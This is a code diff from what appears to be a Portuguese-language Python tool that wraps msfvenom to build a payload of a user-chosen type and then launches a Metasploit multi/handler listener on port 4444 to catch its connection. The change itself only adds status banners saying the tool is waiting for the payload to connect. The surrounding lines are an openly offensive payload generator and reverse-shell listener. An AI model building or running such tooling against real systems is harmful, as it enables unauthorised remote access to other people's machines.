@@ -91,6 +91,11 @@ while True:
         payload = input("\033[32m[+] Digite o nome do arquivo de saída: \033[0m")
         criar2 = f"msfvenom -p {alvo1} LHOST=localhost LPORT=4444 {arquivo} -o {payload}"
         os.system(criar2)
+        print("\n\033[35m┌────────────────────────────────────────────────────────────┐")
+        print("│             \033[36mOuvindo Seu Payload, Aguarde...          \033[35m│")
+        print("└────────────────────────────────────────────────────────────┘\033[0m")
+        print("\033[33m[*] Aguardando conexão do payload...\033[0m")
+
         ouvir_payload = f"msfconsole -x 'use exploit/multi/handler; set payload {alvo1}; set LHOST localhost; set LPORT 4444; exploit'"
         os.system(ouvir_payload)
     
